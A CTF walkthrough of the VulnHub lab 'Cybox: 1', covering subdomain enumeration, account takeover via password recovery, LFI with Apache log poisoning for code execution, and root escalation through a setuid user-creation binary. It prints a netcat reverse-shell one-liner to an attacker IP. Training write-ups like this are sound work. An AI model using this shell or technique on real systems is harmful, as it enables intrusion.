@@ -1,0 +1,108 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Cybox: 1  VulnHub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/cybox-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-12-04T09:04:21+00:00">December 4, 2020</time><time class="updated" datetime="2025-07-09T11:44:51+00:00">July 9, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<a style="color: #000000;" href="https://www.vulnhub.com/entry/cybox-1,607/"><span style="color: #0000ff;"><strong>Cybox: 1</strong></span></a>“. It’s available at VulnHub for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <strong><a style="color: #000000;" href="https://twitter.com/@takito1812">takito1812</a></strong>. Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">Level: <strong>Medium</strong></span></p>
+<p><span style="color: #000000;">Since these labs are available on the <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/cybox-1,607/">VulnHub</a></strong> website.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Gobuster</span></li>
+<li><span style="color: #000000;">Dirsearch</span></li>
+<li><span style="color: #000000;">lse.sh</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">RCE with LFI and Apache Log Poisoning</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abuse uncommon setuid binaries user register</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<h3><span style="color: #800000;">Reconnaissance</span></h3>
+<p><span style="color: #000000;">We put the IP address in “<strong>etc/hosts</strong>” file and execute <strong>nmap</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A cybox.thm</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B2TW7-jhzoA/X8n1lSeAQpI/AAAAAAAArSk/1MI1Ahm08tQfXi8bAVh7vhh7yG8D0-CigCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Firstly, we access the port <strong>80</strong> web service and find the corporation’s website, we check the code and the robots.txt file, but we find nothing relevant.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Mt5i5d5wDM/X8n1sm_tO6I/AAAAAAAArSo/wu3Gy97eQQolCFZmu-8BDG_28v5AcwbUwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">We helped ourselves from <strong>Gobuster</strong> and listed 5<u> corporate subdomains</u>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DVDP8c0iQ0A/X8n1xlOeVmI/AAAAAAAArSs/AK6DNcJRlYopeCxvXMzrbH8Sp6_XH9u3wCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We access this domain and find a file “<strong>Phpinfo.php</strong>“, these files are very useful to list operating system, versions of deployed applications, absolute paths, and so on.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JolHdc_q11o/X8n12NBXEpI/AAAAAAAArSw/BdqvRQwl_rUhUbjThh3JcVope2OvMC9IACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Another subdomain takes us to an <strong>FTP</strong>, but we will not use the anonymous user credentials, we move to another subdomain and list an administration panel of a monitoring system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nRf5nDiPtgc/X8n1_qKPU5I/AAAAAAAArS4/ZovbLgJ6iYUt0Q7IkoPREpMLd3U8SxOxgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We tried brute force with the user “<strong>admin@cybox.company</strong>” and better-known password dictionaries, but no luck.</span></p>
+<p><span style="color: #000000;">Now we try to register a user and log in with it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b9e6qNNbgxo/X8n2Egj_x8I/AAAAAAAArTA/QEDhFUxHYT0khBEFilyqF3VFUulVuTeEwCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We move to another subdomain, we list webmail deployed with <strong>SquirrelMail v1.4.22</strong>, we also try brute force with more common password dictionary but without success.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-17RKpm03wE8/X8n2Jcu6eEI/AAAAAAAArTI/OrmFBmiMk8Iato-UejBWRPVJlq8DeL--wCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Continue with another subdomain and see a form that allows us to <strong><u>create users</u></strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5tXC3Q60a6g/X8n2QJ4fCrI/AAAAAAAArTM/WUwXPEvxy2Q34fbqCLKTk9iFHd6i_vtlACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We register the user “<strong>menosdonald</strong>” and a mail, according to the answer of the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8GVjo_0JBJE/X8n2U9w_4OI/AAAAAAAArTU/GnpVZvyLg3wSnCQN2AxmKrLWJLY_nj5KACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">We use the credentials and see that we have been able to get into the mail.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q8Isnxyuzic/X8n2aUBG7WI/AAAAAAAArTc/d5O5kG3vZLwTaJXNGcCPkDz4ZMlpNkF_gCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">If we remember, we had the exact version of SquirrelMail, we looked for exploits and found a wonderful <strong>RCE</strong> that also matches our version ….. But after several attempts, methods and other exploits, it is not possible to climb from here, so we are facing a “rabbit hole” (I will kill you takito!!!)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fHLdCtLvFd8/X8n2iDfOkeI/AAAAAAAArTg/5kglOCxw5ik3nyYu3VKhvrj9vchwBzgcACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">After several hours of research, it occurred to me to use the “<strong>recovery</strong>” option, thinking that I could still change the user from the request.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5XHz6x_gdGE/X8n2oHInXLI/AAAAAAAArTo/3uKQfFhYEokE0U36UZGJI42V_TtxjqO4wCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">When I changed the tab, I saw that I received this nice email.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4estlSrb9rI/X8n2tAK36AI/AAAAAAAArTw/EJcrNmnZieoQITXIAOOu-ml7X9V3TdzwQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We change the username, put the <strong>admin</strong> name and change the password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-klXop8dScEI/X8n2wwXaLoI/AAAAAAAArT0/vatfZWiKzpAm6-IWBjYsjDuRh-QcnYjeACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Once inside as administrator, we click on the option “<strong>Admin panel</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fbPptkVetqo/X8n21S0asxI/AAAAAAAArT8/ABcLR_Pv1BUyLLNMOEyK1e7Z8NMvCVrXgCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">We open the site, it shows us that it is under construction, we check the source code and see that it calls the style sheet by means of a variable and from a php file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tZP1DkcM4jY/X8n28-naIAI/AAAAAAAArUE/CZSOuR4pScUhCQd0IG1N8Lb2tSXSuDAjQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">With the findings, we try to load the file “<strong>/etc/passwd</strong>” as a proof of concept, we see that it is indeed <strong>vulnerable</strong> to local file inclusion (<strong>LFI</strong>). We also show that our user is part of the system, a pity that it does not have SSH service….</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l1Eg6_HA8mA/X8n3CAE3HqI/AAAAAAAArUQ/Qlx4hkxug7sJO27vsrCqIZbu8d7OpeNBACLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We check the file “<strong>phpinfo.php</strong>” found above, list <u>the absolute path of apache2</u>, insert our <strong>PHP</strong> code into the User-Agent and execute the “<strong>whoami</strong>” command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gT2kOv6jS7w/X8n3eoW2DJI/AAAAAAAArUk/9WL0sK2trsw1YOIOvMs_IQWCysWDlrQawCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">But what happens? It doesn’t work!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MhRGefSyGhE/X8n3mEO-J9I/AAAAAAAArUo/fgKvbC0kdC8mmqOYoMnUKUzgVNH5BmJmQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">We see that only <strong>gobuster</strong> appears, this tool was only used for the discovery of sub-domains, the only sub-domain that I did NOT visit via <strong>HTTP</strong> was the <strong>FTP</strong> service. Let’s access and dirty the registry.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-59iko0vtjVo/X8n3q3OvHpI/AAAAAAAArUs/IfyGwth-NeUoKawVn6rOdjp-xZBvkuiiQCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We access the log again and this time we do have movement!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jhy0IyW9xvM/X8n3wWmUPnI/AAAAAAAArU0/abEb9WBFF2wm9JwPZBi-MUVK8L5LgkyRwCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Then, we access again the <u>subdomain of the FTP service</u>, insert our <strong>PHP code</strong> in the User-Agent and make the request.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IHWmFFzH9Eo/X8n34Tt4jDI/AAAAAAAArU4/0zBM9KKawhIPL_2qlCdAbv3jnzNz6ZlXwCLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">We run the <strong>Apache log</strong> again with the command “<strong>id</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z2lENsb6XKs/X8n3-yMiJQI/AAAAAAAArVA/e7O8Zj9-vewWXC99fWdF1XlU8oY5vOFAgCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">Now it is! Great!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I_UZnW51ghE/X8n4D0_roVI/AAAAAAAArVE/T02KQdIR09k8-_cG_2cKfYMJckEvcVV1ACLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">Now we will insert the following trace to obtain a reverse shell, we encode in “<strong>URL Encode</strong>” and we put a netcat to the listening</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OCEHvI9dHyI/X8n4Ub9VUiI/AAAAAAAArVQ/wCg-w_KPf5c_t_5PrV8mo9-jogy7Lu-_wCLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">If everything went well, we will have a shell. As always, we will use these two commands to get an <strong>interactive shell</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TNfDLAZwlFs/X8n4cewFPbI/AAAAAAAArVU/9n4mFdAv3P887WzN1-1r9C-jFhuO6gxtgCLcBGAsYHQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">We access the directory “<strong>/home/Cybox</strong>” and read the flag of <strong>user.txt</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gNfDnNOfCOU/X8n4gNT66CI/AAAAAAAArVY/-hJU0rYTHcczGvmSsKbOaIu-XLEeSZ3CwCLcBGAsYHQ/s16000/27.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation (root)</strong></span></h3>
+<p><span style="color: #000000;">I didn’t find the way to authenticate with the user “<strong>cybox</strong>“, so I authenticated with mine (<strong>menosdonald</strong>).</span></p>
+<p><span style="color: #000000;">After several enumeration tests, we run the “<strong><a style="color: #000000;" href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh">lse.sh</a></strong>” tool and find this uncommon binary setuid that catches our attention.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CbmmSstNjwA/X8n4nh_z2wI/AAAAAAAArVg/bGIKXc-ZzcArUBuMr_5fzdBih9siSPVlgCLcBGAsYHQ/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">This binary is the one that we could execute from one of the subdomains to create the user “<strong>menosdonald</strong>“. What this script does is to create a user and add it to a workgroup with the same name, <u>“</u><strong>root</strong><u>“</u> is already registered… What another user (or group) has elevated privileges?</span></p>
+<p><span style="color: #000000;">We read our file “<strong>/etc/sudoers</strong>” and we have the group “<strong>SUDO</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PClKwQy154M/X8n4r44ByRI/AAAAAAAArVk/biv1KV8BRZI02shB0zs4O28Npwh3ouBYQCLcBGAsYHQ/s16000/29.png"/></span></p>
+<p><span style="color: #000000;">We register the user “<strong>sudo</strong>“, we authenticate with him, we check that everything is correct and of course, we check that we have high permissions.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wbe1M3gjBFg/X8n4vz2zi-I/AAAAAAAArVw/tqfCE-GMbCYpmNrOU9OraRI8CfIdzg8wQCLcBGAsYHQ/s16000/30.png"/></span></p>
+<p><span style="color: #000000;">And finally, we can read our <strong>root.txt</strong> flag</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Oi2hZ_uingY/X8n40yyV-II/AAAAAAAArV0/XK9FvYC3UL8jSFKxcvLtnQlKK0BrHS71wCLcBGAsYHQ/s16000/31.png"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
